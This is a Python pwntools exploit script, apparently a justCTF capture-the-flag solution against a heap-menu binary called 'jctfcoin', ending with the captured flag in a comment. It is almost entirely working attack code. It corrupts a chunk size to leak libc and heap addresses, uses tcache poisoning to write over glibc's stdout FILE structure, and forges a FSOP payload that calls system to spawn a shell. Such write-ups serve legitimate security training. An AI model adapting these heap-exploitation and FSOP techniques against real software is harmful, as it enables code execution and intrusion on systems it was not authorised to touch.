#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
continue
"""

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = "./jctfcoin_patched"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

def create(idx, size, name):
    sla(b"command: ", b"1")
    sla(b"index: ", str(idx).encode())
    sla(b"length: ", str(size).encode())
    sla(b"name: ", name)

def view(idx):
    sla(b"command: ", b"2")
    sla(b"index: ", str(idx).encode())

def update(idx, name):
    sla(b"command: ", b"3")
    sla(b"index: ", str(idx).encode())
    sla(b"name: ", name)

def delete(idx):
    sla(b"command: ", b"4")
    sla(b"index: ", str(idx).encode())

def add(idx, value, desc_len = 16, desc = b"A"):
    sla(b"command: ", b"5")
    sla(b"index: ", str(idx).encode())
    sla(b"mine: ", str(value).encode())
    sla(b"length: ", str(desc_len).encode())
    sla(b"description: ", desc)

# Leak Libc
create(0, 0x20, b"A" * 8)
create(1, 0x60, b"B" * 8)
create(2, 0x1e0, b"C" * 8)
create(3, 0x180, b"D" * 8)
create(4, 0x1e0, b"1" * 8)
update(0, b"A" * 0x28 + p64(0x421))
delete(1)
create(1, 0x60, b"1" * 8) # Still old 1

view(2)
recvunt(b"balance: ")
libc_leak = int(recvunt(" ").decode())
libc.address = libc_leak - 0x203b20
info("Libc: " + hex(libc.address))

# Leak heap
create(5, 0x1e0, b"E" * 8) # Overlap chunk 2
delete(5)
view(2)
recvunt(b"balance: ")
mangled_leak = int(recvunt(" ").decode())
heap = (mangled_leak << 12) - 0x1000
info("Heap: " + hex(heap))

# Setup tcache-poisoning to stdout
create(5, 0x1e0, b"E" * 8) # Overlap chunk 2
delete(4)
delete(5)

_IO_2_1_stdout_ = libc.address + 0x2045c0
info(hex(_IO_2_1_stdout_))
environ_mangle = (_IO_2_1_stdout_ - 0x10) ^ (heap + 0x1320) >> 12
view(2)
recvunt(b"balance: ")
mangled_leak = int(recvunt(" ").decode())
info("Target: " + hex(environ_mangle))
add(2, 0xffffffffffffffff - mangled_leak)
add(2, environ_mangle + 1)
# # add(2, 1)
sleep(2)
create(6, 0x1e0, b"F" * 8)
create(7, 0x1e0, b"G" * 1)

# # overwrite stdout -> fsop
system = libc.symbols['system']
fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = system
fp._lock = _IO_2_1_stdout_ + 0x50
fp._wide_data = _IO_2_1_stdout_
fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x20
payload = bytes(fp) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
info(len(payload))
update(7, payload)


io.interactive()

# justCTF{m4yb3_1ts_n0t_4s_thr34d_l0c4l_4s_1_3xp3ct3d}